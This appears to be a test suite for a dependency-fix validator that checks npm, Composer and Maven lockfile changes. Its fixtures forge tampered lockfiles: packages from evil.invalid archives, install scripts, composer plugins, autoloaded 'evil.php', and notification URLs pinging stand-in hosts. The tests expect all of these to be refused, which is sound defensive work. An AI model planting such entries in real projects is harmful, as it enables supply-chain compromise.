    const base = files({ "composer.json": json("5.4.0"), "composer.lock": lock([entry("v5.4.0")]) });
    // A downgrade, and a "from" the base does not lock (4.4.0 -> 4.4.50 while the base has 5.4.0).
    expect(contentProblem("composer", fixOf("symfony/http-foundation", "5.4.0", "5.3.0", ["composer.json", "composer.lock"]), base, files({ "composer.json": json("5.3.0"), "composer.lock": lock([entry("v5.3.0")]) }))).toContain("is not an update to a higher version");
    expect(contentProblem("composer", fixOf("symfony/http-foundation", "4.4.0", "4.4.50", ["composer.json", "composer.lock"]), base, files({ "composer.json": json("4.4.50"), "composer.lock": lock([entry("v4.4.50")]) }))).toContain("the base's composer.lock has v5.4.0");
    expect(contentProblem("composer", fixOf("symfony/http-foundation", "5.4.0", "5.4.54", ["composer.json", "composer.lock"]), base, files({ "composer.json": json("5.4.54"), "composer.lock": lock([entry("v5.4.54")]) }))).toBeNull();
    const pom = readFileSync(new URL("../../../examples/maven-security/pom.xml", import.meta.url), "utf8");
    expect(contentProblem("maven", fixOf("org.apache.commons:commons-lang3", "3.11", "3.10", ["pom.xml"]), files({ "pom.xml": pom }), files({ "pom.xml": pom }))).toContain("is not an update to a higher version");
    // npm: the lockfile moves only the fix's package, by install path; another entry changing is refused, a new one that
    // the fixed version requires is not.
    const npmLock = (packages: Record<string, unknown>, root: Record<string, unknown> = { name: "app", dependencies: { lodash: "^4.17.20" } }) => JSON.stringify({ name: "app", lockfileVersion: 3, packages: { "": root, ...packages } });
    const pkg = JSON.stringify({ name: "app", dependencies: { lodash: "4.17.20" } }), fixedPkg = JSON.stringify({ name: "app", dependencies: { lodash: "4.17.21" } });
    const npmBase = files({ "package.json": pkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.20" }, "node_modules/minimist": { version: "1.2.6" } }) });
    const fix = fixOf("lodash", "4.17.20", "4.17.21", ["package.json", "package-lock.json"]);
    expect(contentProblem("npm", fix, npmBase, files({ "package.json": fixedPkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.21", dependencies: { "new-dep": "^1.0.0" } }, "node_modules/minimist": { version: "1.2.6" }, "node_modules/new-dep": { version: "1.0.0" } }) }))).toBeNull();
    expect(contentProblem("npm", fix, npmBase, files({ "package.json": fixedPkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.21" }, "node_modules/minimist": { version: "1.2.8" } }) }))).toContain("changes node_modules/minimist (1.2.6 -> 1.2.8), which this fix does not plan");
    // The entry's own name is not trusted: minimist filed under "lodash" still counts as minimist.
    expect(contentProblem("npm", fix, npmBase, files({ "package.json": fixedPkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.21" }, "node_modules/minimist": { name: "lodash", version: "1.2.8" } }) }))).toContain("changes node_modules/minimist (1.2.6 -> 1.2.8)");
    // An alias in the base named for the fix's package: its move is still another package's (review 6516135819, N7).
    const aliased = files({ "package.json": pkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.20" }, "node_modules/m-alias": { name: "lodash", version: "1.0.0" } }) });
    expect(contentProblem("npm", fix, aliased, files({ "package.json": fixedPkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.21" }, "node_modules/m-alias": { name: "lodash", version: "2.0.0" } }) }))).toContain("changes node_modules/m-alias (1.0.0 -> 2.0.0), which this fix does not plan");
    // The lock is tied to the receipt's change, by install path (reviews 6516135819, N2, and 6518582507, N-a): the base
    // has the package at `from` at a path, the fix has it at `to` at that path and nowhere at `from`; an entry's own name
    // does not count. A transitive fix (package.json does not change), as the reviews forged it: minimist 1.2.5 -> 1.2.6.
    const transitive = fixOf("minimist", "1.2.5", "1.2.6", ["package.json", "package-lock.json"]);
    const lockOf = (packages: Record<string, unknown>, root?: Record<string, unknown>) => files({ "package.json": pkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.20" }, ...packages }, root) });
    const vulnerable = lockOf({ "node_modules/minimist": { version: "1.2.5" } });
    // The fixed version's new dependencies, hoisted or nested, and theirs: each is what a moved or added path requires.
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6", dependencies: { "new-dep": "^1.0.0", nested: "2" } }, "node_modules/new-dep": { version: "1.0.0", optionalDependencies: { deeper: "*" } }, "node_modules/deeper": { version: "3.0.0" }, "node_modules/minimist/node_modules/nested": { version: "2.0.0" } }))).toBeNull();
    expect(contentProblem("npm", transitive, npmBase, lockOf({ "node_modules/minimist": { version: "1.2.6" } }))).toContain("the base's package-lock.json does not have minimist at that version");
    expect(contentProblem("npm", transitive, lockOf({}), lockOf({ "node_modules/lodash/node_modules/evil-copy": { version: "9.9.9" } }))).toContain("the base's package-lock.json does not have minimist");
    // An npm alias of minimist (an entry `name`d minimist under another path) is minimist: the base's alias at 1.2.5 is a
    // planned path, so the fix must move it too (review 6529858505, B2), and moved, nothing more is asked of it here.
    expect(contentProblem("npm", transitive, lockOf({ "node_modules/evil": { name: "minimist", version: "1.2.5" } }), lockOf({ "node_modules/evil": { name: "minimist", version: "1.2.6" } }))).toBeNull();
    // B2's example: the base has lodash at node_modules/lodash and an alias of it, both 4.17.20; a fix that moves only the
    // first leaves the alias at the version replaced, and is refused.
    const aliasRoot = { name: "app", dependencies: { lodash: "^4.17.20", "lodash-old": "npm:lodash@^4.17.20" } };
    const withAlias = (version: string, alias: string) => files({ "package.json": version === "4.17.20" ? pkg : fixedPkg, "package-lock.json": npmLock({ "node_modules/lodash": { version }, "node_modules/lodash-old": { name: "lodash", version: alias } }, aliasRoot) });
    expect(contentProblem("npm", fix, withAlias("4.17.20", "4.17.20"), withAlias("4.17.21", "4.17.20"))).toContain("does not have lodash at 4.17.21, the fix's version, at node_modules/lodash-old, where the base has 4.17.20");
    expect(contentProblem("npm", fix, withAlias("4.17.20", "4.17.20"), withAlias("4.17.21", "4.17.21"))).toBeNull();
    // An alias of another package at the package's own path is not it (the path's name alone does not count either).
    expect(contentProblem("npm", transitive, lockOf({ "node_modules/minimist": { name: "is-number", version: "1.2.5" } }), lockOf({ "node_modules/minimist": { name: "is-number", version: "1.2.6" } }))).toContain("the base's package-lock.json does not have minimist at that version");
    // The base has 1.2.5 only under another name (review 6518582507, N-b R5).
    expect(contentProblem("npm", transitive, lockOf({ "node_modules/other": { version: "1.2.5" }, "node_modules/minimist": { version: "1.2.0" } }), lockOf({ "node_modules/other": { version: "1.2.6" }, "node_modules/minimist": { version: "1.2.0" } }))).toContain("the base's package-lock.json does not have minimist at that version");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.5" }, "node_modules/lodash/node_modules/evil-copy": { version: "9.9.9" } }))).toContain("does not have minimist at 1.2.6, the fix's version");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.5" }, "node_modules/x": { name: "minimist", version: "1.2.6" } }))).toContain("does not have minimist at 1.2.6");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6" }, "node_modules/lodash/node_modules/minimist": { version: "1.2.5" } }))).toContain("still has minimist at 1.2.5, which the fix moves");
    // The forged locks of review 6518582507: a key npm installs nothing at, filed as minimist (B1); a package nothing
    // requires beside the real move (N-a a); the top-level copy removed and 1.2.6 only nested (N-a b); an alias of
    // another package at the planned path (N-a c).
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "aaaaaaaaaaaaminimist": { version: "1.2.6" } }))).toContain("has aaaaaaaaaaaaminimist, which is not an install path");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6" }, "node_modules/is-number": { version: "7.0.0" } }))).toContain("adds node_modules/is-number, which no package the fix moves or adds requires");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/lodash/node_modules/minimist": { version: "1.2.6" } }))).toContain("does not have minimist at 1.2.6, the fix's version, at node_modules/minimist");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { name: "evil", version: "1.2.6" } }))).toContain("does not have minimist at 1.2.6, the fix's version, at node_modules/minimist");
    // A required name resolves to the nearest copy: a top-level copy that a nested one hides from the requirer is stray.
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6", dependencies: { dep: "1" } }, "node_modules/minimist/node_modules/dep": { version: "1.0.0" }, "node_modules/dep": { version: "1.0.0" } }))).toContain("adds node_modules/dep, which no package");
    // Removing or adding anything else, a link, a project folder (even unchanged), and the root's other requirements.
    expect(contentProblem("npm", transitive, files({ "package.json": pkg, "package-lock.json": npmLock({ "node_modules/lodash": { version: "4.17.20" }, "node_modules/minimist": { version: "1.2.5" } }, { name: "app" }) }), files({ "package.json": pkg, "package-lock.json": npmLock({ "node_modules/minimist": { version: "1.2.6" } }, { name: "app" }) }))).toContain("removes node_modules/lodash (4.17.20), which this fix does not plan");
    // When something requires the removed copy, the lock is not read at all.
    expect(contentProblem("npm", transitive, vulnerable, files({ "package.json": pkg, "package-lock.json": npmLock({ "node_modules/minimist": { version: "1.2.6" } }) }))).toContain("the project requires lodash ^4.17.20, and npm finds no copy of it in the lock");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6", dependencies: { x: "file:evil" } }, "node_modules/x": { resolved: "evil", link: true } }))).toContain("adds node_modules/x, which is not an installed package");
    const folder = { "packages/a": { name: "a", version: "1.0.0" } };
    expect(contentProblem("npm", transitive, lockOf({ "node_modules/minimist": { version: "1.2.5" }, ...folder }), lockOf({ "node_modules/minimist": { version: "1.2.6" }, ...folder }))).toContain("has packages/a, which is not an install path");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6" } }, { name: "app", dependencies: { lodash: "^4.0.0" } }))).toContain("changes the project's own entry beyond the fix's requirement");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6" } }, { name: "app", dependencies: { lodash: "^4.17.20", minimist: "1.2.6" } }))).toContain("changes the project's own entry beyond the fix's requirement");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6" }, "node_modules/../x": { version: "1.0.0" } }))).toContain("package-lock.json is not one Ludion reads (Unexpected package-lock path: node_modules/../x.)");
    // An added copy must be the package its requirer asks for, at a version its range takes. An alias of another package
    // and a version outside the range are refused by readLock already (review of ebfe89d); an added alias that the spec
    // asks for (npm:evil@1.0.0) is read, and the PR job's walk still refuses another package brought in under the name.
    for (const [foo, range] of [[{ name: "evil", version: "1.0.0" }, "^1.0.0"], [{ version: "2.0.0" }, "^1.0.0"]] as const) {
      expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6", dependencies: { foo: range } }, "node_modules/foo": foo }))).toMatch(/node_modules\/minimist requires foo \^1\.0\.0, and node_modules\/foo has (evil|foo)@[12]\.0\.0, which is not that/);
    }
    // An added alias that its requirer's own spec asks for (npm:evil@1.0.0) is what npm installs for it: read, as npm
    // reads it (the registry check, npmAgain, ties that spec to the registry's).
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6", dependencies: { foo: "npm:evil@1.0.0" } }, "node_modules/foo": { name: "evil", version: "1.0.0" } }))).toBeNull();
    // Read as the judge reads it (review of 7d25696, N3): two paths that differ only in case, and a version that is not semver.
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6" }, "node_modules/Minimist": { version: "1.2.6" } }))).toContain("not one Ludion reads (Two package-lock paths differ only in case");
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6", dependencies: { x: "*" } }, "node_modules/x": { version: "latest" } }))).toContain("not one Ludion reads (Invalid locked version at node_modules/x.)");
    // An added copy that an unchanged package now loads instead of its own (review of 7d25696, B1 (B)): the nested
    // minimist 0.0.10 -> 0.2.4 under optimist, with a wordwrap 1.0.0 beside it that optimist then loads, not 0.0.3.
    const optimist = (packages: Record<string, unknown>, ranges = { minimist: "~0.0.1", wordwrap: "~0.0.2" }) => files({ "package.json": pkg, "package-lock.json": npmLock({ "node_modules/minimist": { version: "1.2.8" }, "node_modules/optimist": { version: "0.6.1", dependencies: ranges }, "node_modules/wordwrap": { version: "0.0.3" }, ...packages }, { name: "app", dependencies: { optimist: "0.6.1" } }) });
    const nested = fixOf("minimist", "0.0.10", "0.2.4", ["package.json", "package-lock.json"]);
    // With optimist's real ranges the moved minimist is outside optimist's own (review of ebfe89d, B1: a dependent left
    // outside its range), which npm `install` would mend with an unpinned copy.
    expect(contentProblem("npm", nested, optimist({ "node_modules/optimist/node_modules/minimist": { version: "0.0.10" } }), optimist({ "node_modules/optimist/node_modules/minimist": { version: "0.2.4", dependencies: { wordwrap: "1.0.0" } }, "node_modules/optimist/node_modules/wordwrap": { version: "1.0.0" } }))).toContain("package-lock.json's packages: node_modules/optimist requires minimist ~0.0.1, and node_modules/optimist/node_modules/minimist has minimist@0.2.4, which is not that.");
    // With ranges that take any version, the shadow itself is what is refused.
    const any = { minimist: "*", wordwrap: "*" };
    expect(contentProblem("npm", nested, optimist({ "node_modules/optimist/node_modules/minimist": { version: "0.0.10" } }, any), optimist({ "node_modules/optimist/node_modules/minimist": { version: "0.2.4", dependencies: { wordwrap: "1.0.0" } }, "node_modules/optimist/node_modules/wordwrap": { version: "1.0.0" } }, any))).toContain("changes what node_modules/optimist loads for wordwrap (node_modules/wordwrap -> node_modules/optimist/node_modules/wordwrap)");
    // Nested under the moved copy instead, wordwrap 1.0.0 is that copy's own: optimist still loads 0.0.3.
    expect(contentProblem("npm", nested, optimist({ "node_modules/optimist/node_modules/minimist": { version: "0.0.10" } }, any), optimist({ "node_modules/optimist/node_modules/minimist": { version: "0.2.4", dependencies: { wordwrap: "1.0.0" } }, "node_modules/optimist/node_modules/minimist/node_modules/wordwrap": { version: "1.0.0" } }, any))).toBeNull();
    // The shadow check reads an unmoved entry's optional and peer requirements, and the project's dev, optional and peer
    // groups, not only `dependencies` (review 6529858505, N2): an added copy under b, reached from the moved minimist,
    // would change what b loads for w; and a top-level copy the project's own group asks for, missing at the base.
    for (const group of ["optionalDependencies", "peerDependencies"]) {
      const underB = (packages: Record<string, unknown>) => lockOf({ "node_modules/b": { version: "1.0.0", [group]: { w: "*" } }, "node_modules/w": { version: "1.0.0" }, ...packages }, { name: "app", dependencies: { lodash: "^4.17.20", b: "1.0.0" } });
      expect(contentProblem("npm", transitive, underB({ "node_modules/b/node_modules/minimist": { version: "1.2.5" } }), underB({ "node_modules/b/node_modules/minimist": { version: "1.2.6", dependencies: { w: "*" } }, "node_modules/b/node_modules/w": { version: "2.0.0" } })), group).toContain("changes what node_modules/b loads for w (node_modules/w -> node_modules/b/node_modules/w)");
    }
    for (const group of ["devDependencies", "optionalDependencies", "peerDependencies"]) {
      const project = { name: "app", dependencies: { lodash: "^4.17.20" }, [group]: { w: "*" } };
      expect(contentProblem("npm", transitive, lockOf({ "node_modules/minimist": { version: "1.2.5" } }, project), lockOf({ "node_modules/minimist": { version: "1.2.6", dependencies: { w: "*" } }, "node_modules/w": { version: "1.0.0" } }, project)), group).toContain("changes what the project loads for w (nothing -> node_modules/w)");
    }
    // A base whose own project requirement npm finds no copy of is read (the requirement is the project's own; see
    // docs/decisions/2026-10-31-lock-requirements-against-the-base.md), and a fix that adds a copy the project then loads is
    // refused by the shadow check.
    expect(contentProblem("npm", transitive, lockOf({ "node_modules/minimist": { version: "1.2.5" } }, { name: "app", dependencies: { lodash: "^4.17.20", "left-pad": "1" } }), lockOf({ "node_modules/minimist": { version: "1.2.6", dependencies: { "left-pad": "1" } }, "node_modules/left-pad": { version: "1.0.0" } }, { name: "app", dependencies: { lodash: "^4.17.20", "left-pad": "1" } }))).toContain("changes what the project loads for left-pad (nothing -> node_modules/left-pad)");
    // The review of ebfe89d's three forms, each refused by the same reading in both views: a requirement the lock leaves
    // out, one held by a copy outside its range (the axios 0.21.2 / follow-redirects 1.13.3 form), and npm 6's tree alike.
    expect(contentProblem("npm", transitive, vulnerable, lockOf({ "node_modules/minimist": { version: "1.2.6", dependencies: { "is-number": "^7.0.0" } } }))).toContain("node_modules/minimist requires is-number ^7.0.0, and npm finds no copy of it in the lock.");
    expect(contentProblem("npm", transitive, lockOf({ "node_modules/minimist": { version: "1.2.5" }, "node_modules/is-number": { version: "6.0.0" } }), lockOf({ "node_modules/minimist": { version: "1.2.6", dependencies: { "is-number": "^7.0.0" } }, "node_modules/is-number": { version: "6.0.0" } }))).toContain("node_modules/minimist requires is-number ^7.0.0, and node_modules/is-number has is-number@6.0.0, which is not that.");
  });
  it("npm: an entry the fix does not plan may differ from the base in its flags only (review 6538813186, B1)", () => {
    const fix = fixOf("node-fetch", "2.6.1", "2.6.7", ["package.json", "package-lock.json"]);
    const side = (v: string, s: "base" | "fix") => readFileSync(new URL(`fixtures/npm-corpus/extra/node-fetch/${v}/${s}/package-lock.json`, import.meta.url), "utf8");
    const pkg = (v: string, s: "base" | "fix") => readFileSync(new URL(`fixtures/npm-corpus/extra/node-fetch/${v}/${s}/package.json`, import.meta.url), "utf8");
    for (const v of ["v2", "v3"]) {
      const was = side(v, "base"), is = side(v, "fix");
      // What npm wrote: whatwg-url, tr46 and webidl-conversions lose `dev`, and nothing else of theirs changes.
      for (const path of ["node_modules/whatwg-url", "node_modules/tr46", "node_modules/webidl-conversions"]) {
        const [a, b] = [JSON.parse(was).packages[path], JSON.parse(is).packages[path]];
        expect(a.dev, `${v} ${path}`).toBe(true);
        expect({ ...b, dev: true }, `${v} ${path}`).toEqual(a);
      }
      expect(lockEntryChanges(lockEntries(was), lockEntries(is)).map(e => `${e.path}@${e.version}`), v).toEqual(["node_modules/node-fetch@2.6.7"]);
      expect(contentProblem("npm", fix, files({ "package.json": pkg(v, "base"), "package-lock.json": was }), files({ "package.json": pkg(v, "fix"), "package-lock.json": is })), v).toBeNull();
    }
    // The same fix with one more change to tr46 (v3, which has no npm 6 tree to keep in step).
    const was = files({ "package.json": pkg("v3", "base"), "package-lock.json": side("v3", "base") });
    const tr46 = (change: (entry: Record<string, unknown>) => void) => {
      const lock = JSON.parse(side("v3", "fix"));
      change(lock.packages["node_modules/tr46"]);
      return contentProblem("npm", fix, was, files({ "package.json": pkg("v3", "fix"), "package-lock.json": JSON.stringify(lock, null, 2) }));
    };
    for (const [what, change] of [
      ["another key", (e: Record<string, unknown>) => { e.license = "0BSD"; }],
      ["its integrity", (e: Record<string, unknown>) => { e.integrity = "sha512-AAAA"; }],
      ["a flag that is not true", (e: Record<string, unknown>) => { e.dev = false; }],
      ["a flag as a string", (e: Record<string, unknown>) => { e.optional = "true"; }],
      ["inBundle", (e: Record<string, unknown>) => { e.inBundle = true; }],
      ["a flag change with another key", (e: Record<string, unknown>) => { e.peer = true; e.hasInstallScript = true; }],
    ] as const) expect(tr46(change), what).toContain("package-lock.json changes node_modules/tr46 (0.0.3 -> 0.0.3), which this fix does not plan.");
    // Flags npm would not write there pass: whether they are the ones npm computes is not checked (the hole docs/status.md lists).
    expect(tr46(e => { e.dev = true; e.devOptional = true; })).toBeNull();
  });
  it("advisory IDs: only the forms a receipt can hold (OSV's for npm, Packagist and Maven, and Packagist's own)", () => {
    for (const id of ["GHSA-35jh-r3h4-6jhm", "CVE-2021-23337", "CVE-2024-1234567", "MAL-2024-12345", "PKSA-n8pg-4n3p-wcn3"]) expect(ADVISORY.test(id), id).toBe(true);
    for (const id of ["GH-1", "GHSA-35jh-r3h4-6jh1", "GHSA-35jh-r3h4", "CVE-21-1", "MAL-x", "PYSEC-2021-1", "OSV-2020-1", "PKSA-", "PKSA-a-", "ghsa-35jh-r3h4-6jhm", "GHSA-35jh-r3h4-6jhm\n"]) expect(ADVISORY.test(id), id).toBe(false);
    // What packagist.ts reads as a PKSA ID is exactly what ADVISORY lets through (review 6518582507, N-d).
    for (const id of ["PKSA-n8pg-4n3p-wcn3", "PKSA-a", "PKSA-ab", "PKSA-", "PKSA-a-", "PKSA--a", "PKSA-A", `PKSA-${"a".repeat(60)}`, `PKSA-${"a".repeat(61)}`]) expect(PKSA_ID.test(id), id).toBe(ADVISORY.test(id));
  });
  it("a changed file's size limit: twice the base's file and 1 MiB, at most 50 MiB", () => {
    expect(fileLimit(0)).toBe(1024 * 1024);
    expect(fileLimit(10 * 1024 * 1024)).toBe(21 * 1024 * 1024);
    expect(fileLimit(40 * 1024 * 1024)).toBe(FILE_LIMIT);
  });
  it("Maven: pom.xml is exactly what changedManifest makes for the change", () => {
    const pom = readFileSync(new URL("../../../examples/maven-security/pom.xml", import.meta.url), "utf8");
    const dir = mkdtempSync(join(tmpdir(), "ludion-deliver-pom-"));
    writeFileSync(join(dir, "pom.xml"), pom);
    const change = { name: "org.apache.commons:commons-lang3", from: "3.11", to: "3.18.0", advisories: [] };
    const expected = changedManifest(dir, "maven", [change]), fix = fixOf(change.name, change.from, change.to, ["pom.xml"]);
    expect(contentProblem("maven", fix, files({ "pom.xml": pom }), files({ "pom.xml": expected }))).toBeNull();
    const plugin = expected.replace("</project>", "<build><plugins><plugin><groupId>evil</groupId><artifactId>evil</artifactId></plugin></plugins></build></project>");
    expect(contentProblem("maven", fix, files({ "pom.xml": pom }), files({ "pom.xml": plugin }))).toMatch(/pom.xml is not what Ludion writes/);
  });
  it("Composer: composer.lock moves only the planned package, from a pinned archive, and adds no plugin", () => {
    const entry = (name: string, version: string, ref: string, extra: Record<string, unknown> = {}) => ({ name, version, dist: { type: "zip", url: `https://api.github.com/repos/${name}/zipball/${ref}`, reference: ref, shasum: "" }, type: "library", ...extra });
    const a = "a".repeat(40), b = "b".repeat(40), c = "c".repeat(40);
    const json = { name: "app", require: { "symfony/http-foundation": "5.4.0" } }, fixedJson = { name: "app", require: { "symfony/http-foundation": "5.4.54" } };
    const lock = (packages: unknown[]) => `${JSON.stringify({ _readme: ["x"], "content-hash": "1", packages, "packages-dev": [], "plugin-api-version": "2.6.0" }, null, 4)}\n`;
    const before = { "composer.json": JSON.stringify(json), "composer.lock": lock([entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.0", b)]) };
    const fix = fixOf("symfony/http-foundation", "5.4.0", "5.4.54", ["composer.json", "composer.lock"]);
    const after = (packages: unknown[], top: Record<string, unknown> = {}) => files({ "composer.json": JSON.stringify(fixedJson), "composer.lock": `${JSON.stringify({ _readme: ["x"], "content-hash": "2", packages, "packages-dev": [], "plugin-api-version": "2.6.0", ...top }, null, 4)}\n` });
    // The fix itself, with descriptive metadata changed on another package, a new dependency, and the newer Composer of
    // the tool image (examples/composer-security: plugin-api-version 2.9.0 -> 2.11.0).
    const fixed = entry("symfony/http-foundation", "v5.4.54", c, { require: { "symfony/polyfill-php83": "^1.27" } });
    expect(contentProblem("composer", fix, files(before), after([entry("symfony/deprecation-contracts", "v2.5.0", a, { "published-time": "2026-06-27T21:46:34+00:00" }), fixed, entry("symfony/polyfill-php83", "v1.31.0", c, { require: { "symfony/polyfill-mbstring": "^1" }, "notification-url": "https://packagist.org/downloads/" }), entry("symfony/polyfill-mbstring", "v1.31.0", c)], { "plugin-api-version": "2.11.0" }))).toBeNull();
    // The same package from another repository, a new package nothing requires, a notification-url (Composer calls it).
    for (const [packages, why] of [
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...fixed, dist: { type: "zip", url: `https://api.github.com/repos/evil/http-foundation/zipball/${c}` } }], "from another archive repository than the base did"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...fixed, source: { type: "git", url: "https://github.com/evil/http-foundation.git", reference: c } }], "changes where symfony/http-foundation comes from"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), fixed, entry("symfony/polyfill-php83", "v1.31.0", c), entry("evil/unrequired", "1.0.0", c)], "adds evil/unrequired, which the fixed version does not require"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), fixed, entry("symfony/polyfill-php83", "v1.31.0", c), entry("symfony/deprecation-contracts", "v2.5.0", "e".repeat(40))], "lists symfony/deprecation-contracts more than once"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), fixed, { ...entry("symfony/polyfill-php83", "v1.31.0", c), dist: { type: "zip", url: "https://evil.invalid/polyfill.zip" } }], "takes symfony/polyfill-php83 from outside the pinned public archives"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a, { "notification-url": "https://evil.invalid/ping" }), fixed, entry("symfony/polyfill-php83", "v1.31.0", c)], "changes symfony/deprecation-contracts"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), fixed, entry("symfony/polyfill-php83", "v1.31.0", c, { "notification-url": "https://evil.invalid/ping" })], "gives the new symfony/polyfill-php83 a notification-url other than Packagist's"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...fixed, scripts: { "post-install-cmd": "evil" } }, entry("symfony/polyfill-php83", "v1.31.0", c)], "gives symfony/http-foundation keys Ludion does not check (scripts)"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...fixed, "notification-url": "https://evil.invalid/ping" }, entry("symfony/polyfill-php83", "v1.31.0", c)], "changes symfony/http-foundation's notification-url"],
    ] as const) expect(contentProblem("composer", fix, files(before), after([...packages]))).toContain(why);
    for (const [packages, why] of [
      [[entry("symfony/deprecation-contracts", "v2.5.1", a), entry("symfony/http-foundation", "v5.4.54", c)], "changes symfony/deprecation-contracts"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a, { autoload: { files: ["evil.php"] } }), entry("symfony/http-foundation", "v5.4.54", c)], "changes symfony/deprecation-contracts"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.53", c)], "not to the fix's version"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), { ...entry("symfony/http-foundation", "v5.4.54", c), dist: { type: "zip", url: "https://evil.invalid/x.zip" } }], "outside the pinned public archives"],
      [[entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.54", c), entry("evil/plugin", "1.0.0", c, { type: "composer-plugin" })], "a composer-plugin"],
      [[entry("symfony/http-foundation", "v5.4.54", c)], "removes symfony/deprecation-contracts"],
    ] as const) expect(contentProblem("composer", fix, files(before), after([...packages]))).toContain(why);
    expect(contentProblem("composer", fix, files(before), after([entry("symfony/deprecation-contracts", "v2.5.0", a), entry("symfony/http-foundation", "v5.4.54", c)], { repositories: [{ type: "vcs", url: "https://evil.invalid" }] }))).toContain("changes its repositories");
    // composer.json: only the planned requirement, raised as changedManifest raises it.
    const looser = files({ "composer.json": JSON.stringify({ ...fixedJson, scripts: { "post-install-cmd": "evil" } }), "composer.lock": before["composer.lock"] });
    expect(contentProblem("composer", fix, files(before), looser)).toContain("composer.json is not what Ludion writes");
  });
});
